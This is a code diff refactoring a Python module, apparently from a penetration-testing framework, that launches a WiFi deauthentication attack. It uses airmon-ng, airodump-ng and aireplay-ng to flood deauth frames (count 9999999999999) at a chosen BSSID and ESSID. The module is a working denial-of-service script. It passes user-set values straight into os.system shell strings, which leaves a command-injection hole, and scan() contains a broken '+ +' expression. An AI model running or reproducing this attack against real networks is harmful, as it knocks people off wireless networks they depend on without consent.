@@ -20,47 +20,33 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('interface', 'wlan0'),
-	('bssid', 'none'),
-	('essid', 'none'),
-	('mon', 'mon0'),
-	('channel', '11'),
-))
-
-vdesc = [
-	'wireless interface name',
-	'target BSSID address',
-	'target ESSID name',
-	'monitor',
-	'target channel number',
-]
-
-# Help for the custom commands (remove if you will not use custom commands)
-mhelp = OrderedDict((
-	('scan', 'scan for target'),
-	('stop', 'terminate process'),
+	('interface', ['wlan0', 'wireless interface name']),
+	('bssid', ['none', 'target BSSID address']),
+	('essid', ['none', 'target ESSID name']),
+	('mon', ['mon0', 'monitor']),
+	('channel', ['11', 'target channel number']),
 ))
 
 # Additional help notes
 help_notes = colors.red+"this module will not work without root permission!\n this module will not work without xterm, aircrack-ng!"+colors.end
 
 # Used with custom commands (remove this if are not using custom commands)
-customcommands = (
-	'scan',
-	'stop'
-)
+customcommands = {
+	'scan': 'scan for target',
+	'stop': 'terminate process'
+}
 
 # Simple changelog
 changelog = "Version 1.0:\n\trelease"
 
 
 def run():
-	print (colors.green + "[*]Attack Has Been Started on : " + variables['essid'])
+	print (colors.green + "[*]Attack Has Been Started on : " + variables['essid'][0])
 	print ("use command 'stop' to end attack" + colors.end)
-	xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'] + " --bssid " + variables['bssid'] + " " + variables['mon'] + " &"
+	xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'][0] + " --bssid " + variables['bssid'][0] + " " + variables['mon'][0] + " &"
 	os.system(xterm_3)
 	sleep(4)
-	xterm_4 = "xterm -e "+"aireplay-ng"+" --deauth 9999999999999 -o 1 -a " + variables['bssid'] + " -e " + variables['essid'] + " " + variables['mon'] + " &"
+	xterm_4 = "xterm -e "+"aireplay-ng"+" --deauth 9999999999999 -o 1 -a " + variables['bssid'][0] + " -e " + variables['essid'][0] + " " + variables['mon'][0] + " &"
 	os.system(xterm_4)
 	sleep(1)
 	os.system(xterm_4)
@@ -70,13 +56,13 @@ def run():
 def stop(args):
 	subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-	xterm_5 =  "airmon-ng"+" stop " + variables['interface']
+	xterm_5 =  "airmon-ng"+" stop " + variables['interface'][0]
 	os.system(xterm_5)
 	print(colors.green+"process terminated..."+colors.end)
 
 def scan(args):
-	xterm_1 = "airmon-ng"+" start " + variables['interface']
-	xterm_2 = "xterm -e "+"airmon-ng " + + variables['mon'] + " &"
+	xterm_1 = "airmon-ng"+" start " + variables['interface'][0]
+	xterm_2 = "xterm -e "+"airmon-ng " + + variables['mon'][0] + " &"
 	subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	sleep(3)
 	os.system(xterm_2)
